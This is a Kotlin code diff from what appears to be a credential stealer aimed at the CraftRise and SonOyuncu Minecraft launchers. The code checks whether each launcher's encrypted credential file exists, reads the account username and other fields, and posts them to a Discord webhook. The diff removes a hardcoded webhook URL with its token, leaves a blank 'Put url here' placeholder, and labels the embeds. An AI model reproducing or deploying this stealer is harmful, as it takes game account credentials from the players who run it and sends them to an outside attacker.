@@ -16,14 +16,17 @@ import java.util.*
 object Runnable {
     @JvmStatic
     fun main(args: Array<String>) {
+
+        val url = "" //Put url here.
+
         try {
             val raccoon = Craftrise()
             if (raccoon.encryptedLocation.exists() && raccoon.encryptedLocation.isFile)
                 raccoon.apply {
-                    val webhookSender = WebhookUtil("https://canary.discord.com/api/webhooks/963782448938885200/y3udOITullDk8bOPmPOpgMSgstMwBMdYkY_8AA2DDI3InjkmG9JC2q-5fvb8FEC021To")
+                    val webhookSender = WebhookUtil(url)
                     webhookSender.addEmbed(
                         EmbedObject()
-                            .setAuthor("", "", "https://www.programtr.net/wp-content/uploads/2020/12/raccoonHead.png")
+                            .setAuthor("CraftRise", "", "https://www.programtr.net/wp-content/uploads/2020/12/raccoonHead.png")
                             .setColor(Color(Random().nextInt(0xFFFFFF)))
                             .setThumbnail("https://minotar.net/avatar/${raccoon.getUsername()}")
                             .addField("Username", raccoon.getUsername(), true)
@@ -41,10 +44,10 @@ object Runnable {
             val bitwise = SonOyuncu()
             if (bitwise.encryptedLocation.exists() && bitwise.encryptedLocation.isFile)
                 bitwise.apply {
-                    val webhookSender = WebhookUtil("https://canary.discord.com/api/webhooks/963782448938885200/y3udOITullDk8bOPmPOpgMSgstMwBMdYkY_8AA2DDI3InjkmG9JC2q-5fvb8FEC021To")
+                    val webhookSender = WebhookUtil(url)
                     webhookSender.addEmbed(
                         EmbedObject()
-                            .setAuthor("", "", "https://sonoyuncu.com.tr/img/sonoyuncu-logo-registered.png")
+                            .setAuthor("SonOyuncu", "", "https://sonoyuncu.com.tr/img/sonoyuncu-logo-registered.png")
                             .setColor(Color(Random().nextInt(0xFFFFFF)))
                             .setThumbnail("https://minotar.net/avatar/${bitwise.getUsername()}")
                             .addField("Username", bitwise.getUsername(), true)
